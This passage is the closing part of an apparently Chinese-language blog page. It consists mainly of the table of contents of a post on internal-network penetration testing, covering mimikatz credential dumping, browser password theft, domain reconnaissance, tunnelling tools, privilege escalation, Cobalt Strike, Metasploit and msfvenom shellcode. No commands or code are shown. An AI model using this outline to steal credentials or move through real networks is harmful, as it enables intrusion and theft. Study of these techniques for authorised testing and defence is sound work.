href="#%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.2.21.</span> <span class="toc-text">查看网络代理信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8BPPTP%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.2.22.</span> <span class="toc-text">查看PPTP配置信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8BRDP%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.2.23.</span> <span class="toc-text">查看RDP远程桌面信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81"><span class="toc-number">1.5.2.24.</span> <span class="toc-text">查看数据库密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF-sc-query"><span class="toc-number">1.5.2.25.</span> <span class="toc-text">查看服务信息 sc query</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%BF%A1%E6%81%AF-reg"><span class="toc-number">1.5.2.26.</span> <span class="toc-text">导出注册表信息 reg</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.2.27.</span> <span class="toc-text">导出日志信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bhosts%E6%96%87%E4%BB%B6"><span class="toc-number">1.5.2.28.</span> <span class="toc-text">查看hosts文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%AD%E9%97%B4%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.2.29.</span> <span class="toc-text">查看中间件信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%BB%84%E7%AD%96%E7%95%A5-gpresult"><span class="toc-number">1.5.2.30.</span> <span class="toc-text">查看组策略 gpresult</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-number">1.5.2.31.</span> <span class="toc-text">查看启动项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81-mimikatz"><span class="toc-number">1.5.2.32.</span> <span class="toc-text">抓取密码 mimikatz</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81"><span class="toc-number">1.5.2.33.</span> <span class="toc-text">浏览器密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9B%9E%E6%94%B6%E7%AB%99"><span class="toc-number">1.5.2.34.</span> <span class="toc-text">查看回收站</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E4%BF%A1%E6%81%AF-nltest-x2F-net"><span class="toc-number">1.5.2.35.</span> <span class="toc-text">查看域信息 nltest&#x2F;net</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.5.3.</span> <span class="toc-text">Linux信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">操作系统基本信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">系统环境信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">系统服务信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.3.4.</span> <span class="toc-text">系统软件信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BD%9C%E4%B8%9A"><span class="toc-number">1.5.3.5.</span> <span class="toc-text">系统任务和作业</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E5%92%8C%E7%BB%84%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.3.6.</span> <span class="toc-text">用户信息和组信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%92%8C%E6%9D%83%E9%99%90%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.3.7.</span> <span class="toc-text">用户和权限信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E5%92%8C%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.3.8.</span> <span class="toc-text">系统网络和路由信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%85%B6%E4%BB%96%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.3.9.</span> <span class="toc-text">获取其他信息</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.5.4.</span> <span class="toc-text">域内信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%9F%9F"><span class="toc-number">1.5.4.1.</span> <span class="toc-text">判断是否存在域</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ipconfig"><span class="toc-number">1.5.4.1.1.</span> <span class="toc-text">ipconfig</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF-systeminfo"><span class="toc-number">1.5.4.1.2.</span> <span class="toc-text">查看系统详细信息 systeminfo</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%99%BB%E5%BD%95%E5%9F%9F%E4%B8%8E%E5%9F%9F%E7%94%A8%E6%88%B7-netconfig"><span class="toc-number">1.5.4.1.3.</span> <span class="toc-text">查看当前登录域与域用户 netconfig</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E4%B8%BB%E5%9F%9F-net-time"><span class="toc-number">1.5.4.1.4.</span> <span class="toc-text">判断主域 net time</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E5%9F%9F%E5%86%85%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.4.2.</span> <span class="toc-text">收集域内基础信息</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F-net-view"><span class="toc-number">1.5.4.2.1.</span> <span class="toc-text">查看域 net view</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%86%85%E8%AE%A1%E7%AE%97%E6%9C%BA-net-view"><span class="toc-number">1.5.4.2.2.</span> <span class="toc-text">查看域内计算机 net view</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E7%BB%84%E5%88%97%E8%A1%A8-net-group"><span class="toc-number">1.5.4.2.3.</span> <span class="toc-text">查看域内用户组列表 net group</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%88%97%E8%A1%A8-net-group"><span class="toc-number">1.5.4.2.4.</span> <span class="toc-text">查看域管理员列表 net group</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BC%81%E4%B8%9A%E7%AE%A1%E7%90%86%E5%91%98%E5%88%97%E8%A1%A8-net-group"><span class="toc-number">1.5.4.2.5.</span> <span class="toc-text">查看企业管理员列表 net group</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%86%85%E7%BD%AEadministrator%E7%BB%84%E7%94%A8%E6%88%B7"><span class="toc-number">1.5.4.3.</span> <span class="toc-text">查看域内置administrator组用户</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E4%BF%A1%E6%81%AF-net-accounts"><span class="toc-number">1.5.4.3.1.</span> <span class="toc-text">查看域密码策略信息 net accounts</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E4%BF%A1%E4%BB%BB%E4%BF%A1%E6%81%AF-nltest"><span class="toc-number">1.5.4.3.2.</span> <span class="toc-text">查看域信任信息 nltest</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E5%9F%9F%E7%94%A8%E6%88%B7%E5%92%8C%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.4.4.</span> <span class="toc-text">收集域用户和管理员信息</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8-net-user"><span class="toc-number">1.5.4.4.1.</span> <span class="toc-text">查询域用户列表 net user</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E7%94%A8%E6%88%B7%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF-wmic-useraccount"><span class="toc-number">1.5.4.4.2.</span> <span class="toc-text">查询域用户详细信息 wmic useraccount</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%AD%98%E5%9C%A8%E7%9A%84%E7%94%A8%E6%88%B7"><span class="toc-number">1.5.4.4.3.</span> <span class="toc-text">查询存在的用户</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.4.5.</span> <span class="toc-text">收集域控制器信息</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%8E%A7%E4%B8%BB%E6%9C%BA%E5%90%8D"><span class="toc-number">1.5.4.5.1.</span> <span class="toc-text">查看域控主机名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%88%97%E8%A1%A8-net-group"><span class="toc-number">1.5.4.5.2.</span> <span class="toc-text">查看域控制器列表 net group</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.5.4.6.</span> <span class="toc-text">查找域管理员进程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%88%97%E8%A1%A8"><span class="toc-number">1.5.4.6.1.</span> <span class="toc-text">获取域管理员列表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E6%9C%AC%E6%9C%BA%E7%9A%84%E6%89%80%E6%9C%89%E8%BF%9B%E7%A8%8B%E5%8F%8A%E8%BF%9B%E7%A8%8B%E7%94%A8%E6%88%B7"><span class="toc-number">1.5.4.6.2.</span> <span class="toc-text">列出本机的所有进程及进程用户</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">1.5.4.7.</span> <span class="toc-text">定位域管理员</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#psloggedon%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.5.4.7.1.</span> <span class="toc-text">psloggedon查询</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#netview%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.5.4.7.2.</span> <span class="toc-text">netview查询</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%BB%A3%E7%90%86"><span class="toc-number">1.6.</span> <span class="toc-text">内网穿透代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Neo-reGeorg"><span class="toc-number">1.6.1.</span> <span class="toc-text">Neo-reGeorg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh"><span class="toc-number">1.6.2.</span> <span class="toc-text">ssh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nps"><span class="toc-number">1.6.3.</span> <span class="toc-text">nps</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#frp"><span class="toc-number">1.6.4.</span> <span class="toc-text">frp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.7.</span> <span class="toc-text">内网权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83"><span class="toc-number">1.7.1.</span> <span class="toc-text">Windows系统提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83"><span class="toc-number">1.7.2.</span> <span class="toc-text">Linux系统提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7"><span class="toc-number">1.8.</span> <span class="toc-text">内网渗透工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CobaltStrike"><span class="toc-number">1.8.1.</span> <span class="toc-text">CobaltStrike</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit"><span class="toc-number">1.8.2.</span> <span class="toc-text">Metasploit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#msfconsole%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97%EF%BC%88Auxiliary%EF%BC%89"><span class="toc-number">1.8.2.1.</span> <span class="toc-text">msfconsole辅助模块（Auxiliary）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msfconsole%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97-Post"><span class="toc-number">1.8.2.2.</span> <span class="toc-text">msfconsole后渗透攻击模块 (Post)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msfconsole%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97%EF%BC%88Exploit%EF%BC%89"><span class="toc-number">1.8.2.3.</span> <span class="toc-text">msfconsole渗透攻击模块（Exploit）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msfenvom%E7%94%9F%E6%88%90shell-code"><span class="toc-number">1.8.2.4.</span> <span class="toc-text">msfenvom生成shell code</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msfenvom%E7%94%9F%E6%88%90%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-number">1.8.2.5.</span> <span class="toc-text">msfenvom生成可执行文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.8.2.6.</span> <span class="toc-text">Meterpreter常用命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84%E7%A7%8Dshell%E7%9A%84%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2"><span class="toc-number">1.8.3.</span> <span class="toc-text">各种shell的相互转换</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#msf%E6%B4%BE%E7%94%9Fshell%E7%BB%99cobalt-Strike"><span class="toc-number">1.8.3.1.</span> <span class="toc-text">msf派生shell给cobalt Strike</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cobalt-Strike%E8%81%94%E5%8A%A8msf"><span class="toc-number">1.8.3.2.</span> <span class="toc-text">cobalt Strike联动msf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#command-shell%E8%BD%ACmeterpreter"><span class="toc-number">1.8.3.3.</span> <span class="toc-text">command shell转meterpreter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#meterpreter%E8%BD%ACcommand-shell"><span class="toc-number">1.8.3.4.</span> <span class="toc-text">meterpreter转command shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%85%B6%E4%BB%96%E5%91%BD%E4%BB%A4"><span class="toc-number">1.9.</span> <span class="toc-text">内网其他命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3389%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE"><span class="toc-number">1.9.1.</span> <span class="toc-text">3389端口开放</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.9.2.</span> <span class="toc-text">powershell文件下载</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>